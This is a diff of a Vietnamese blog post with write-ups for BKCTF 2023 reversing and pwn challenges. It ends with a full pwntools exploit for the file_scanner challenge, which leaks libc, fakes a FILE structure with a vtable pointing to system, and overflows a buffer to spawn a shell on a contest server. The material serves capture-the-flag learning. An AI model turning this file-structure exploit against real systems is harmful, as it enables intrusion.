@@ -9,7 +9,6 @@ toc:
   enable: true
 description: "Solutions for some challenges in BKCTF 2023 by ducdatdau"
 ---
-
 <style>
 img {
     box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
@@ -19,19 +18,9 @@ img {
 }
 </style>
 
-![](./0.jpg)
+<img src="./2.jpg">
 
 BKCTF là giải mà mình lần đầu tiên được tham gia onsite. Host là câu lạc bộ BKSEC của Trường Đại học Bách khoa Hà Nội, nơi đào tạo kỹ thuật hàng đầu tại Việt Nam, là niềm mơ ước của biết bao thế hệ học sinh, sinh viên trong nước. Mình nhớ tới BKSEC vì có biết một số anh chị rất khủng và có tiếng tăm trong ngành như anh chung96vn, chị lanleft, anh hacmao, ... 
-
-Sau một năm, mình muốn chơi lại giải này để xem thử trình độ của mình đã tiến bộ được chút nào hay chưa. Đề bài mình chơi vẫn đang được mở trên web [Cookie Hân Hoan](https://battle.cookiearena.org/arenas/bkctf-2023), các bạn hoàn toàn có thể vào chơi và tận hưởng bộ đề theo mình nghĩ là khá thú vị. 
-
-![](3.jpg "Phòng LAB siêu đẹp của CLB BKSEC")
-
-![](1.jpg "2 team có bức hình chung với anh Hiếu - Founder Cookie Hân Hoan")
-
-![](2.jpg "Thank youuuu")
-
-# Let's get started
 
 ## rev/BabyStack
 
@@ -41,7 +30,7 @@ Sau một năm, mình muốn chơi lại giải này để xem thử trình đ�
 * **Description:** Stack up to the moon. Flag format: `BKSEC{}`
 {{< /admonition >}}
 
-**Solution**
+---
 
 > Theo quan điểm cá nhân của mình, bài này không thực sự quá khó. Nếu ai đã từng có một chút kinh nghiệm làm các dạng bài StackVM thì sẽ thấy bài này khá nhẹ nhàng. Mình sẽ cố gắng đi chi tiết từng thao tác nhỏ để các bạn mới có thể dễ dàng tiếp cận. Happy hacking ... 
 
@@ -102,7 +91,7 @@ Tạo tiếp một struct `struct_vm` như sau
 
 và ép kiểu cho field đầu tiên là `*struct_vtable` mà chúng ta đã định nghĩa ở phía trên. 
 
-Right click `v19`, nhấn `Convert to Struct * ...` và chọn `struct_vm` để sửa lại cấu trúc cho `v19`. 
+Right click `v19`, nhấn **Convert to Struct * ...** và chọn `struct_vm` để sửa lại cấu trúc cho `v19`. 
 
 ### Analyze 
 
@@ -173,15 +162,15 @@ Tóm tắt đoạn code trên như sau:
   * Được xử lý bởi hàm `PUSH`
 - Nếu `[idx + 1] != 6` thì: 
   - Instruction sẽ có kích thước 2 byte, bắt đầu từ `[idx]` tới `[idx + 1]`
-  - Dựa vào `[idx + 1]` mà có 7 lựa chọn để gọi hàm xử lý: 
-    - `CMP = 0`
-    - `XOR = 1`
-    - `ADD = 2`
-    - `SUB = 3`
-    - `SHL = 4`
-    - `SHR = 5`
-    - `POP = 7`
-    - `AND = 8`
+  - Dựa vào `[idx + 1]` mà có 8 lựa chọn để gọi hàm xử lý: 
+    - CMP = 0
+    - XOR = 1
+    - ADD = 2
+    - SUB = 3
+    - SHL = 4
+    - SHR = 5
+    - POP = 7
+    - AND = 8
 
 Dưới đây là minh họa cho việc mình rename và retype cho hàm `PUSH`. Các hàm khác các bạn làm tương tự thì code sẽ clean hơn rất nhiều. 
 
@@ -284,7 +273,7 @@ while (idx < len(bytecodes)):
         idx += 2
 ```
 
-Mình sẽ thử phân tích một phần nhỏ kết quả thu được đầu tiên với `input` = `abcdefghiklm12345678`
+Mình sẽ thử phân tích một phần nhỏ kết quả thu được đầu tiên với input = **abcdefghiklm12345678**
 
 ```assembly
 PUSH 0x1
@@ -337,8 +326,6 @@ Flag thu được là `BKSEC{C0nGratul4t31}`
 * **Description:** A simple reversing challenge... Flag format: `BKSEC{}`
 {{< /admonition >}}
 
-**Solution**
-
 Đề bài cho chúng ta một file PE32 `reality.exe`. Khi decompile file này, IDA không cho chúng ta mã giả. Mình sẽ đi đọc mã assembly kết hợp debug để xem chương trình đang làm gì. 
 
 <img src="./11.png" width=350px style="display: block; margin-left: auto; margin-right: auto;">
@@ -375,7 +362,7 @@ Ta thấy ở `loc_40131F` là câu lệnh
 ```assembly
 jmp short near ptr loc_40131F+1 
 ```
-nghĩa là cứ đến đây nó sẽ bị lặp vô tận. Mình nhận ra có gì đó sai sai nên đã ấn `d` để tách hết thành từng bytecode và ấn `c` để make code lại. Kết quả thu được như sau 
+nghĩa là cứ đến đây nó sẽ bị lặp vô tận. Mình nhận ra có gì đó sai sai nên đã ấn **d** để tách hết thành từng bytecode và ấn **c** để make code lại. Kết quả thu được như sau 
 
 <img src="./14.png">
 
@@ -421,7 +408,17 @@ Updating ...
 * **Description:** The most powerful tool maybe the worst :(. Flag format: `BKSEC{}`
 {{< /admonition >}}
 
-**Solution**
+---
+
+{{< admonition note >}}
+Có thể gặp vấn đề permission denied sau khi đã `chmod +x ./file_scanner`. Mình đã fix bằng cách tạo symlink tên chuẩn để loader tìm thấy được. 
+
+```shell
+ln -sf ld-2.23.so ld-linux.so.2
+ln -sf libc_32.so.6 libc.so.6 
+```
+{{< /admonition >}}
+
 
 Chương trình tạo 1 số random 16 byte và bắt chúng ta phải nhập chính xác số random đó. 
 
@@ -445,6 +442,8 @@ v3 = time(0);
 
 Ta hoàn toàn có thể bypass hàm `strncmp` với input `\n`. 
 
+<br/>
+
 Dễ thấy ý đồ của tác giả là muốn sử dụng kỹ thuật File Structure Attack. Ở option 4, chương trình có bug BOF như sau 
 
 ```c
@@ -457,9 +456,13 @@ fclose(filePtr);
 exit(1);
 ```
 
-Từ biến `name`, ta hoàn toàn overwrite được `filePtr` lẫn `fileContent`. Vậy mình hoàn toàn fake được `file structure` và `vtable` sao cho toàn bộ hàm trong `vtable` đều là `system`. 
+Từ biến `name`, ta hoàn toàn overwrite được `filePtr` lẫn `fileContent`. Ý tưởng của mình là tạo một fake file structure, sau đó overwrite `filePtr` thành địa chỉ của fake file. Toàn bộ hàm trong `vtable` đều là `system()` của libc, `fakeFile.flags` sẽ trỏ tới chuỗi `/bin/sh\x00`. 
+
+Khi `fclose(filePtr)` thực chất sẽ gọi `system('/bin/sh')`. 
 
 <img src="15.png"/>
+
+<br/>
 
 Để leak được `libc`, chúng ta có thể mở `/proc/self/maps` hoặc `/proc/self/syscall`. 
 
@@ -467,54 +470,67 @@ Full exploit
 
 ```python
 #!/usr/bin/env python3
-
 from pwn import *
+import time 
 
-exe = ELF("./file_scanner_patched", checksec = False)
-libc = ELF("./libc_32.so.6", checksec = False)
-ld = ELF("./ld-2.23.so", checksec = False)
+exe = ELF("./file_scanner_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.23.so")
 
-context.update(os = "linux", arch = "amd64", log_level = "debug", terminal = "cmd.exe /c start wsl".split(), binary = exe)
+p = process(exe.path)
+p = remote('103.97.125.56', 31480)
 
-# p = process(exe.path)
-p = remote("103.97.125.56", 31381)
+context.update(arch='i386', os='linux', log_level='debug', terminal='cmd.exe /c start wsl'.split(), binary=exe)
 
-sl  = p.sendline
-sa  = p.sendafter
-sla = p.sendlineafter
-rl  = p.recvline
-ru  = p.recvuntil
+def GDB():
+    gdb.attach(p, gdbscript='''
+        b *0x8048C9A
+        continue
+    ''')
 
-sla(b"ID: ", "") 
+    pause()
 
-# open /proc/self/syscall 
-sla(b"choice :", b"1")
-sla(b"filename: ", b"/proc/self/syscall")
-sla(b"choice :", b"2")
-sla(b"choice :", b"3")
+# GDB()
 
-libc_leak = int(rl().strip()[-10::], 16)
-libc_base = libc_leak - 0x1ba549
-system = libc_base + libc.symbols["system"] 
+def open_file(fileName): 
+    p.sendlineafter(b'choice :', b'1')
+    p.sendlineafter(b'filename: ', fileName.encode())
 
-log.info(f"libc base = {hex(libc_base)}")
-log.info(f"libc leak = {hex(libc_leak)}")
-log.info(f"system = {hex(system)}")
+def read_file(): 
+    p.sendlineafter(b'choice :', b'2')
 
-sla(b"choice :", b"4")
+def write_file():  
+    p.sendlineafter(b'choice :', b'3')
 
+def close_file():
+    p.sendlineafter(b'choice :', b'4')
+
+p.sendlineafter(b'ID: ', b'') 
+
+open_file('/proc/self/syscall')
+read_file()
+write_file()
+
+libc_leak = int(p.recvline()[:-1].split()[-1].decode(), 16)
+libc.address = libc_leak - 0x1ba549
+
+log.info(f'libc.address: {hex(libc.address)}')
+
+# creat fake file structure
 file = FileStructure()
-file.flags = u32(b"/bin")
-file._IO_read_ptr = u32(b"/sh\x00") 
-file._lock = 0x804b250
-file.vtable = 0x804b178
-binsh = 0x804b0e0
+file.flags = b'/bin' 
+file._IO_read_ptr = b'/sh\x00'
+file._lock = exe.symbols['fileContent'] + 400  
+file.vtable = exe.symbols['fileContent'] + 152 
 
-payload = b"A" * 0x20 + p32(binsh) + b"B" * 28 + bytes(file) + p32(system) * 21
+log.info(f'fake file length: {len(bytes(file))}')
 
-sla(b"name: ", payload)
+payload = b'A' * 32 + p32(0x804b0e0) + p32(0) * 7 + bytes(file) + p32(libc.symbols['system']) * 18
 
-p.interactive() 
+close_file()
+p.sendlineafter(b'name: ', payload)
+
+p.interactive()
 ```
 
-Flag của bài toán là `BKSEC{fSoP_1s_n0t_2_hArd_4_u_d4e2411f244126da3242265c90e10c46}`
+Flag của bài toán là `BKSEC{fSoP_1s_n0t_2_hArd_4_u_1fac8554f8eb55a103be3e34c9cf6940}`
